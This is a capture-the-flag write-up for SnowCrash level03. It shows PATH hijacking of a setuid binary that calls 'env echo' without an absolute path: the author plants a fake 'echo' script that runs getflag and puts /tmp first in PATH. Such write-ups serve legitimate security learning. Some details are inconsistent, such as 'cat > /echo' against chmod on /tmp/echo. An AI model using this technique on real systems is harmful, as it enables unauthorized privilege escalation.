# LEVEL03

## Analysis

After writting "ls -la" then using the command "file" we can find the following binary. 
```bash
    level03@SnowCrash:~$ ls -la
    total 24
    dr-x------ 1 level03 level03  120 Mar  5  2016 .
    d--x--x--x 1 root    users    340 Aug 30  2015 ..
    -r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
    -r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
    -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
    -r-x------ 1 level03 level03  675 Apr  3  2012 .profile
    level03@SnowCrash:~$ file level03 
    level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
```

If we try to run the binary we get the following.
```bash
    level03@SnowCrash:~$ ./level03
    Exploit me
```

Let's try to use the command strings. (to be more specific strings -a -t x ./level03 | grep '/usr/bin/env')
```bash
    level03@SnowCrash:~$ strings ./level03 
    [...]
    /usr/bin/env echo Exploit me
    [...]
```

## Solution

The binary calls an exec*() variant (e.g. execvp, execlp, or system) that runs the program named env without providing an absolute path. When a program calls execvp("env", ...) the kernel searches the directories in the process PATH environment variable, in order, to find an executable named env. By placing a malicious executable with the same name earlier in PATH, we can make the program run our env instead of /usr/bin/env.
This is known as PATH hijacking.

Then we will create a script named "echo" in /tmp to execute the action:
```
    level03@SnowCrash:/tmp$ cat > /echo <<'SH'
    > #!/bin/sh
    > exec /bin/sh -c 'getflag'
    > SH
    level03@SnowCrash:/tmp$ chmod +x /tmp/echo
```

Then we will make sure /tmp is first in PATH for this shell:
```bash
    level03@SnowCrash:/$export PATH=/tmp:$PATH
```

After that we just need to execute the program:
```bash
    level03@SnowCrash:~$ ./level03 
    Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXX
```
